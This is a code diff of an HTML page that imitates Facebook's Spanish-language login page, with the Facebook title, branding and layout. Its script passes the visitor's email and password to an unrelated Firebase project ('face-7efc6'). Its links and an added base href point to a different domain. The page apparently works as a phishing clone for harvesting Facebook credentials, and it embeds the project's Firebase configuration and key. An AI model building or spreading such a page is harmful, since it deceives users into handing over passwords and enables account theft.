@@ -1,8 +1,7 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <base href="https://trustworthy-alternative-social.com">
   <title>Facebook - Inicia sesión o regístrate</title>
   <style>
     * {
@@ -124,86 +123,68 @@
   </style>
 </head>
 <body>
-  <div class="login-container">
-    <div class="branding">
-      <h1 class="title">facebook</h1>
-      <h2 class="subtitle">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h2>
+<div class="login-container">
+  <div class="branding">
+    <h1 class="title">facebook</h1>
+    <h2 class="subtitle">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h2>
+  </div>
+  
+  <div class="main-content">
+    <div class="login-box">
+      <form id="loginForm">
+        <input id="email" type="text" placeholder="Correo electrónico o número de teléfono" required>
+        <input id="password" type="password" placeholder="Contraseña" required>
+        <button class="login-button">Iniciar sesión</button>
+        <div class="forgot-password">
+          <a href="https://trustworthy-alternative-social.com/recover">¿Olvidaste tu contraseña?</a>
+        </div>
+        <div class="divider"></div>
+        <a href="https://trustworthy-alternative-social.com/signup" class="create-account">Crear cuenta nueva</a>
+      </form>
     </div>
-
-    <div class="main-content">
-      <div class="login-box">
-        <form id="loginForm">
-          <input id="email" type="text" placeholder="Correo electrónico o número de teléfono" required>
-          <input id="password" type="password" placeholder="Contraseña" required>
-          <button type="submit" class="login-button">Iniciar sesión</button>
-          <div class="forgot-password">
-            <a href="https://trustworthy-alternative-social.com/recover">¿Olvidaste tu contraseña?</a>
-          </div>
-          <div class="divider"></div>
-          <a href="https://trustworthy-alternative-social.com/signup" class="create-account">Crear cuenta nueva</a>
-        </form>
-      </div>
-
-      <div class="create-page">
-        <a href="https://trustworthy-alternative-social.com/pages/create">Crea una página</a> para una celebridad, una marca o un negocio.
-      </div>
+    
+    <div class="create-page">
+      <a href="https://trustworthy-alternative-social.com/pages/create">Crea una página</a> para una celebridad, una marca o un negocio.
     </div>
   </div>
+</div>
 
-  <script type="module">
-    // Importamos las funciones necesarias de Firebase
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-    import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
+<script type="module">
+  // Importamos las funciones necesarias de Firebase
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+  import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
-    // Configuración de Firebase
-    const firebaseConfig = {
-      apiKey: "AIzaSyA-okgbyWo2fSd41521MGYrRdwE8Kj8UDY",
-      authDomain: "face-7efc6.firebaseapp.com",
-      projectId: "face-7efc6",
-      storageBucket: "face-7efc6.appspot.com",
-      messagingSenderId: "1035061315837",
-      appId: "1:1035061315837:web:74509849ccb74ef7a61694",
-    };
+  // Configuración de Firebase
+  const firebaseConfig = {
+    apiKey: "AIzaSyA-okgbyWo2fSd41521MGYrRdwE8Kj8UDY",
+    authDomain: "face-7efc6.firebaseapp.com",
+    projectId: "face-7efc6",
+    storageBucket: "face-7efc6.appspot.com",
+    messagingSenderId: "1035061315837",
+    appId: "1:1035061315837:web:5929845a7dc409c6a61694"
+  };
 
-    // Inicializar Firebase
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
+  // Inicializar Firebase
+  const app = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
 
-    // Manejo del formulario de inicio de sesión
-    const loginForm = document.getElementById("loginForm");
-    loginForm.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const email = document.getElementById("email").value.trim();
-      const password = document.getElementById("password").value.trim();
+  // Manejo del formulario de inicio de sesión
+  const loginForm = document.getElementById("loginForm");
+  loginForm.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
 
-      // Validaciones
-      if (!email.includes("@")) {
-        alert("Por favor, ingresa un correo electrónico válido.");
-        return;
-      }
-      if (password.length < 6) {
-        alert("La contraseña debe tener al menos 6 caracteres.");
-        return;
-      }
-
-      // Autenticación
-      try {
-        const userCredential = await signInWithEmailAndPassword(auth, email, password);
-        console.log("Inicio de sesión exitoso:", userCredential.user);
-        alert("¡Inicio de sesión exitoso!");
-      } catch (error) {
-        if (error.code === "auth/invalid-email") {
-          alert("Correo electrónico no válido.");
-        } else if (error.code === "auth/user-not-found") {
-          alert("Usuario no encontrado.");
-        } else if (error.code === "auth/wrong-password") {
-          alert("Contraseña incorrecta.");
-        } else {
-          alert("Error al iniciar sesión: " + error.message);
-        }
-      }
-    });
-  </script>
+    try {
+      const userCredential = await signInWithEmailAndPassword(auth, email, password);
+      const user = userCredential.user;
+      console.log("Inicio de sesión exitoso:", user);
+      alert("¡Inicio de sesión exitoso!");
+    } catch (error) {
+      console.error("Error al iniciar sesión:", error.message);
+      alert("Error: " + error.message);
+    }
+  });
+</script>
 </body>
 </html>
-
